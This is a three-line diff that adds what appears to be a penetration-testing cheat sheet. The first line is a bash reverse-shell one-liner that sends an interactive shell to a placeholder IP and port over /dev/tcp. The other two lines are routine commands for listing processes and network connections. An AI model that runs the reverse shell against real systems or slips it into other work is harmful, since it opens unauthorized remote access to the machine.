@@ -1,0 +1,3 @@
+bash -i >& /dev/tcp/IP/PORT 0>&1 //Reverse connection
+ps -ef // list processes, PID's and connections
+netstat -tulpn // list connections
